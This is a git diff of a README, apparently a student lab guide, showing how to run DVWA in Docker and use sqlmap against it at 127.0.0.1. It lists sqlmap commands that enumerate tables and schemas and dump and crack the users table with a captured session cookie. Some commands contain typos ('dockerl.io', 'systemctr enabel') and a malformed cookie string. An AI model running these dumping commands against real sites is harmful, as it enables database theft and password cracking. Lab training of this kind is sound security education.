@@ -1,62 +1,70 @@
-# Installation SQLmap
-
-Preferably, you can download sqlmap by cloning the Git repository:
-
+# SQLmap Installation
+To install SQLmap, it's recommended to clone the Git repository:
 ```zsh
 git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev
 
 ```
-#  Docker Installation 
+#  Docker Installation
+Ensure Docker is installed on your system. If not, you can install it using:
+
 ``` 
 sudo apt install -y dockerl.io
 sudo systemctr enabel docker --now
 sudo usermod -aG docker $USER
 newgrp docker
 ```
-# create a virtual environment using DVWA 
+# Usage with DVWA (Damn Vulnerable Web Application)
+1. Run DVWA Docker container:
+
 ```
  docker run --rm -it -p 80:80 vulnerables/web-dvwa
 ```
-then open 127.0.0.1 using google 
+2. Access DVWA in your browser at http://127.0.0.1.
+
+3. Login with the following credentials:
 
 ```
-username : admin
-password: password
+Username: admin
+Password: password
+
 ```
+4. creat database 
+<img src="./PNGs/1">
 
-creat database 
-<img src="./PNGs/Screenshot from 2024-05-09 14-21-51.png">
+5. go to SQL injection 
+<img src="./PNGs/4.png>
 
-go to SQL injection 
-<img src="./PNGs/Screenshot from 2024-05-09 14-33-51.png>
+# SQL Injection Attack
 
-## SQL Attack
-* write any input here
+1. Navigate to the SQL injection page in DVWA.
+2. Enter any input into the input field.
 
-<img src="./PNGs/Screenshot from 2024-05-09 14-28-15.png">
 
-copy the url and 1press F12 go to applicateion to cookies
-and save the PHPSESSID and security level 
+<img src="./PNGs/5.png">
+
+3. Copy the URL and obtain the PHP session ID (PHPSESSID) and security level cookies.
 
 <img src="./PNGs/2.png">
 
-using sqlmap to see all the tables in this web page using this 
-* you need to change the url and PHPSESSID
+## Using SQLmap
+You can use SQLmap to perform various tasks, such as: 
+* Viewing all tables on the webpage:
 
 ```
 cd sqlmap-dev
 sudo python3 sqlmap.py -u "http://127.0.0.1/vulnerabilities/sqli/?id=ahmad&Submit=Submit" --cookie "75o3da5qmsglsquphnpldhqj53; security=low" --tables  
 ```
-using sqlmap to see all tables schema using this comand 
+* Viewing all table schemas:
+
 ```
 sudo python3 sqlmap.py -u "http://127.0.0.1/vulnerabilities/sqli/?id=ahmad&Submit=Submit" --cookie "75o3da5qmsglsquphnpldhqj53; security=low" --tables  --schema --batch
 ```
-using sqlmap to see schema for specific table using this for users table
+* Viewing schema for a specific table ('users'):
 ``` 
 sudo python3 sqlmap.py -u "http://127.0.0.1/vulnerabilities/sqli/?id=ahmad&Submit=Submit" --cookie "75o3da5qmsglsquphnpldhqj53; security=low" --tables  --schema  --columns -T users --batch 
 ```
 
-if u need to see the table content and crack the password hashes using this comand 
+* Viewing table content and cracking password hashes:
 ``` 
 sudo python3 sqlmap.py -u "http://127.0.0.1/vulnerabilities/sqli/?id=ahmad&Submit=Submit" --cookie "75o3da5qmsglsquphnpldhqj53; security=low" --dump -T users --batch
 ```
